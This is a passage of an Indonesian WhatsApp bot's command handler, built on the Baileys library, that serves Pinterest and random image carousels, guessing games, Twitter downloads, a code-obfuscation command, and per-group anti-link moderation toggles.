        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Adel Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'freya-jkt48': case 'freya': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Freya Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'christy-jkt48': case 'christy': case 'christoy': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Christy Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'tebakjkt48': case 'tebakmember': case 'tebakjeketi': case 'tebakidol': {
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
let timeout = 60000
let id = m.chat
if (id in slime.tebakjkt48) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakjkt48() {
 let anu = await fetchJson('https://cylic.vercel.app/jkt48.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img_alt: result.img_alt,
      name: result.name,
      generation: result.generation
    }}
  let tos = await tebakjkt48 ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi: ${tos.generation}\nWaktu : 60s\nHadiah : 5 limit\n\n(JAWAB DENGAN NAMA LENGKAPNYA)`
 slime.tebakjkt48[id] = [
    await slime.sendMessage(from, {caption: caption, image: {url: tos.img_alt}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (slime.tebakjkt48[id])
 reply(`Waktu Habis\nJawaban:  ${tos.name}\nMedia Sosial: \n\nIngin bermain? Ketik tebakjkt48`)
 delete slime.tebakjkt48[id]
 }, 60000)
	 ]
}
break
case 'tebakbom': {
if (!isRegistered) return reply(mess.regis)
				if (tebakbom[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				tebakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '??'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (tebakbom[m.sender]) m.reply(`_Waktu ${command} habis_`)
						delete tebakbom[m.sender];
					}, 120000)
				}
				m.reply(`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${tebakbom[m.sender].bomb}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`);
			}
			break
case 'tiktoknotnot':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
slime.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'family100': {
  if (!m.isGroup) return reply(mess.only.group)
    let timeout = 60000
  let winScore = 10
 let id = m.chat
	if (id in slime.family100) return reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n\nSoal : ${json.soal}\n\nHadiah : 10 limit\n\nTerdapat *${json.jawaban.length}* Jawaban ${json.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 slime.family100[id] = {
			id,
			msg: await reply(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
case 'gombalan':{
m.reply('Coba pencet link ini dek\nhttps://htmlku.com/taubedanya/main')
}
break
case 'twit': case 'twitter': 
  if (!text) return m.reply('masukkan url twitter');
  try {
    let tw = await (await fetch('https://api.shannmoderz.xyz/downloader/twitter?url=' + text)).json();
    let shannz = tw.result.downloads[1];
    await slime.sendMessage(m.chat, { video: { url: shannz.url }, caption: `*SUCCESS RESOLUSI ${shannz.text} *` },{ quoted: m });
} catch (e) {
    return m.reply('sedang error,' + e);
}
break
case 'twitter2': case 'twitterdl2': case 'twitterdl': {
	if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('x.com')) return reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
slime.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	reply(`Verify that the link is from Twitter`)
	}
}
break
case 'obfus': case 'obfuscate':{
if (!q) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
reply(`Success
${meg.result}`)
}
break
case 'autodownload':
if (!isCreator&&!isPrem) return reply('Khusus Prem')
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autodonlod = true
reply('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autodonlod = false
reply('mode auto download matikan')
} else reply('on / off')
break //Powered By SlimexTzy
case 'listgc': {
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ Group Chat ]*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await slime.groupMetadata(i)
teks += `∘ *Name* : ${metadata.subject}
∘ *Owner* : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
∘ *Id* : ${metadata.id}
∘ *Made* : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
∘ *Member* : ${metadata.participants.length}\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n`
}
slime.sendTextWithMentions(m.chat, teks, m)
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiVirtex) return m.reply('_Sudah Diaktifkan_')
ntvirtex.push(from)
fs.writeFileSync('./database/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di group ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiVirtex) return m.reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('_Sudah Diaktifkan_')
ntilinkytvid.push(from)
fs.writeFileSync('./database/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di group ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('_Sudah Diaktifkan_')
ntilinkytch.push(from)
fs.writeFileSync('./database/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di group ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('_Sudah Diaktifkan_')
ntilinkig.push(from)
fs.writeFileSync('./database/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di group ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('_Sudah Diaktifkan_')
ntilinkfb.push(from)
fs.writeFileSync('./database/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di group ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('_Sudah Diaktifkan_')
ntilinktg.push(from)
fs.writeFileSync('./database/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di group ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('_Sudah Diaktifkan_')
ntilinktt.push(from)
fs.writeFileSync('./database/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di group ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinktwt.push(from)
fs.writeFileSync('./database/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di group ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkall': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinkall.push(from)
fs.writeFileSync('./database/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di group ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//

//=================================================//
case "antiasing":{
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiAsing) return m.reply('_Sudah Diaktifkan_')
ntasing.push(from)
fs.writeFileSync('./database/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return m.reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(from)
ntasing.splice(off, 1)
fs.writeFileSync('./database/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antiwame': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiWame) return m.reply('_Sudah Diaktifkan_')
ntwame.push(from)
